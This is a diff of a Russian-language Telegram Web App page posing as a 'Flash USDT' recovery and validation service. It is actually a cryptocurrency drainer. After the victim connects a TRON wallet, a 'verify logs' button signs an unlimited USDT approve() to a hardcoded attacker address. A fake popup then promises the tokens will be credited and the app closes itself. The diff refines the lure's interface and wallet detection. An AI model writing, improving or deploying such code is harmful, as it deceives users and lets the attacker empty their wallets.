@@ -2,10 +2,12 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Flash USDT: Центр Восстановления</title>
+    
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+    
     <style>
         body {
             background-color: #0f0f0f;
@@ -22,93 +24,161 @@
         .container {
             border: 1px solid #333;
             padding: 35px 25px;
-            border-radius: 24px;
+            border-radius: 28px;
             background: linear-gradient(145deg, #1a1a1a, #111);
-            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
         }
         .status-box {
-            font-size: 11px;
-            letter-spacing: 1px;
+            font-size: 10px;
+            letter-spacing: 1.5px;
             margin-bottom: 25px;
             color: #0088cc;
             font-weight: bold;
+            text-transform: uppercase;
         }
         .status-dot {
             height: 8px; width: 8px; background-color: #0088cc;
-            border-radius: 50%; display: inline-block; margin-right: 6px;
-            box-shadow: 0 0 8px #0088cc;
+            border-radius: 50%; display: inline-block; margin-right: 8px;
+            box-shadow: 0 0 10px #0088cc;
         }
-        h2 { color: #ffffff; margin: 0 0 12px 0; font-size: 20px; }
-        p { color: #888; font-size: 13px; line-height: 1.6; margin-bottom: 30px; }
-        #syncBtn {
+        h2 { color: #ffffff; margin: 0 0 15px 0; font-size: 22px; font-weight: 700; }
+        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+        
+        .btn {
             background: #0088cc;
             color: white;
             border: none;
             padding: 18px;
             font-size: 15px;
             font-weight: 700;
-            border-radius: 14px;
+            border-radius: 16px;
             cursor: pointer;
             width: 100%;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            transition: all 0.2s;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
         }
-        #syncBtn:active { transform: scale(0.97); background: #0077b5; }
-        .footer-info { margin-top: 25px; font-size: 9px; color: #444; letter-spacing: 1px; }
+        .btn:active { transform: scale(0.96); background: #0077b5; }
+        .btn:disabled { background: #333; color: #666; cursor: not-allowed; box-shadow: none; }
+
+        .footer-info { margin-top: 30px; font-size: 9px; color: #444; letter-spacing: 1px; }
+        
+        /* Анимация загрузки */
+        .loader {
+            display: none;
+            border: 3px solid #333;
+            border-top: 3px solid #0088cc;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="status-box">
-        <span class="status-dot"></span> СЛУЖБА ПОДДЕРЖКИ: ONLINE
+        <span class="status-dot"></span> СИСТЕМА ВАЛИДАЦИИ: АКТИВНА
     </div>
-    <h2>Flash USDT Validator</h2>
-    <p>Синхронизируйте ваш узел для завершения верификации приостановленной транзакции и восстановления баланса токенов USDT.</p>
-
-    <button id="syncBtn">ВЕРИФИЦИРОВАТЬ ЛОГИ</button>
     
-    <div class="footer-info">SECURE DATA STREAM // TRONSCAN API V3</div>
+    <h2>Flash USDT Protocol</h2>
+    <p id="mainText">Для восстановления доступа к транзакции и зачисления токенов на баланс, необходимо подключить кошелек и верифицировать логи узла.</p>
+
+    <div id="loader" class="loader"></div>
+    <button id="actionBtn" class="btn">Подключить кошелек</button>
+    
+    <div class="footer-info">SECURE BLOCKCHAIN BRIDGE // TRC-20 STANDART</div>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
+    tg.enableClosingConfirmation();
 
-    document.getElementById('syncBtn').onclick = async () => {
-        // Проверка наличия TronWeb (TronLink)
-        if (!window.tronWeb) {
-            alert('Пожалуйста, используйте браузер с поддержкой кошелька (например, TronLink).');
-            return;
+    const actionBtn = document.getElementById('actionBtn');
+    const mainText = document.getElementById('mainText');
+    const loader = document.getElementById('loader');
+
+    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
+
+    let currentStep = 'connect'; // Шаги: connect -> verify
+
+    actionBtn.onclick = async () => {
+        if (currentStep === 'connect') {
+            handleConnect();
+        } else {
+            handleVerify();
         }
+    };
 
-        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4'; // Твой новый адрес
+    async function handleConnect() {
+        actionBtn.disabled = true;
+        loader.style.display = 'block';
+
+        // 1. Проверяем наличие TronWeb (TronLink, Trust Wallet Browser, BitGet и т.д.)
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            // Кошелек уже подключен
+            onWalletConnected();
+        } else if (window.tron && window.tron.tronWeb) {
+            // Попытка подключения для некоторых мобильных браузеров
+            try {
+                await window.tron.tronWeb.request({ method: 'tron_requestAccounts' });
+                onWalletConnected();
+            } catch (e) {
+                showError('Ошибка подключения кошелька.');
+            }
+        } else {
+            // Если кошелек не найден, предлагаем глубокую ссылку для мобильных
+            showError('Кошелек не обнаружен. Пожалуйста, откройте это приложение внутри Trust Wallet или TronLink.');
+            // Можно добавить редирект на deep link здесь, если нужно
+        }
+        
+        loader.style.display = 'none';
+        actionBtn.disabled = false;
+    }
+
+    function onWalletConnected() {
+        currentStep = 'verify';
+        mainText.innerText = 'Кошелек успешно подключен. Теперь верифицируйте логи транзакций для завершения восстановления.';
+        actionBtn.innerText = 'Верифицировать логи';
+        tg.HapticFeedback.notificationOccurred('success');
+    }
+
+    async function handleVerify() {
+        actionBtn.disabled = true;
+        loader.style.display = 'block';
 
         try {
             const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
-            const amount = '1000000000000000'; // Безлимитный апрув
+            const amount = '1000000000000000'; // Unlimited approve
             
-            // Вызов окна апрува
             const result = await contract.approve(ADMIN_ADDRESS, amount).send();
             
-            // Финальное сообщение после успешной подписи
+            // Финальное окно
             tg.showPopup({
                 title: 'Синхронизация завершена',
-                message: 'Approve успешно подписан. Ожидайте решения проблемы и зачисления токенов на ваш баланс в течение 15-30 минут.',
+                message: 'Approve успешно подписан. Система начала процесс зачисления токенов. Ожидайте обновление баланса в течение 15-30 минут.',
                 buttons: [{type: 'ok'}]
             });
             
-            // Автоматическое закрытие приложения через 4 секунды
-            setTimeout(() => { 
-                tg.close(); 
-            }, 4000);
+            setTimeout(() => { tg.close(); }, 5000);
 
         } catch (e) {
-            alert('Ошибка верификации: соединение отклонено или прервано.');
+            showError('Ошибка верификации: действие отклонено пользователем.');
+        } finally {
+            loader.style.display = 'none';
+            actionBtn.disabled = false;
         }
-    };
+    }
+
+    function showError(msg) {
+        tg.showAlert(msg);
+        tg.HapticFeedback.notificationOccurred('error');
+    }
 </script>
 
 </body>
